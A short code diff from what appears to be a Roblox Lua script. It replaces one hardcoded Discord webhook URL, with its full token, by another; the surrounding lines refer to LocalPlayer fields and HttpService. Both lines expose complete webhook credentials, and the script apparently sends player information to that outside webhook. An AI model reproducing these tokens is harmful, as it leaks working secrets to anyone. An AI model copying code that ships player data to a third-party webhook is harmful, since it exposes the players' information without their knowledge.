@@ -60,7 +60,7 @@ local l = {
 -- Removed the JoinCode field as it's not a standard property of the LocalPlayer
 -- Also removed the Premium field as it's not defined in the script
 
-local url = "https://discord.com/api/webhooks/1265401096038252696/OgzlqfFt2PEMgYURalY1OnIM7WL-llAI89c2QUSEGWRGpTyqP2f4LNiAorfZJDZ0B33v" -- Replace with your webhook URL
+local url = "https://discord.com/api/webhooks/1266681411251994687/alfAkzz9ArhF5XJXFWF6iEoYIbZ5br4bc6ZbbxMF9Vx-yZUKmoHzj9GlsAUQj_PxY7Kf" -- Replace with your webhook URL
 local httpService = game:GetService("HttpService")
 
 local headers = {
